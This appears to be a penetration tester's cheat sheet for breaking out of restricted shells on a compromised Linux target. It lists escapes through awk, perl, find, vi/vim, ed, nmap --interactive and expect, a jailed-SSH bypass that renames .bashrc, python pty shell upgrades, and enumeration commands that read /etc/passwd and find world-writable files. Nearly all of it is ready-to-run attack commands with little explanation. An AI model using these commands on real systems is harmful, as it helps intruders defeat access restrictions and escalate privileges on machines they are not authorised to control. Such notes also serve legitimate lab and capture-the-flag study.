:shell
From within IRB:
exec "/bin/sh"

awk -> awk 'BEGIN {system("/bin/bash")}'
find -> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
perl -> perl -e 'exec "/bin/bash":'
=================================================================================
===Jailed SSH Shell===
Initial shell /bin/sh
If BASH is blocked -> check "env" variable!
Linux defaults to /bin/bash. Default bashrc if NO .bashrc file in 
user's home directory. 

1. ssh user@127.0.0.1 "/bin/sh
2. cd $HOME
3. mv .bashrc .bashrc.BAK
4. exit
5. ssh user@127.0.0.1
Success
user@hostname:~$
=================================================================================
[+ AND EXPORT PATH]
python -c 'import pty: pty.spawn("/bin/bash")'
or
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
=================================================================================
Before PrivEsc References
find / -perm -2 ! -type l -ls 2>/dev/null | sort -r

grep -vE "nologin|false" /etc/passwd
 
=================================================================================
Other, misc
* Grab a valid tty.
* What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
* Want a color terminal to easily tell apart file permissions? Directories? Files?
* Fastest way to list out the files in a directory, show size, show permissions, human readable.
* Make this shell stable.

Is this rbash (Restricted Bash)?
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell

Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'

Is ed present on the target machines?
ed
!sh

Is Nmap present on the target machine?
nmap --interactive
nmap> !sh

Expect:

expect -v
  expect version 5.45.4
  
$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF

$ chmod u+x /tmp/shell.sh
$ /tmp/shell.sh
